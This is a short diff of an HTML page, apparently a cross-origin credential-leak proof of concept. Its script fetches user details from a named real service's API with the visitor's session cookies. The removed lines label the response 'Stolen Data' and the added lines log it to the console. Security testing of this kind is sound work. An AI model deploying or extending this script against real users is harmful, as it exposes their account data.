@@ -9,12 +9,12 @@
 
     <script>
         fetch("https://prod-sports-eng.jiocinema.com/api/user-details", {
-            method: "GET",
-            credentials: "include"
-        })
-        .then(response => response.text())
-        .then(data => alert("Stolen Data: " + data))
-        .catch(error => console.log("Blocked or No Data:", error));
+    method: "GET",
+    credentials: "include" // Ensures it sends the user's session cookies
+})
+.then(response => response.text()) // Convert response to text
+.then(data => console.log("Fetched Data:", data)) // Logs to console
+.catch(error => console.error("Error:", error)); // Shows error
     </script>
 </body>
 </html>
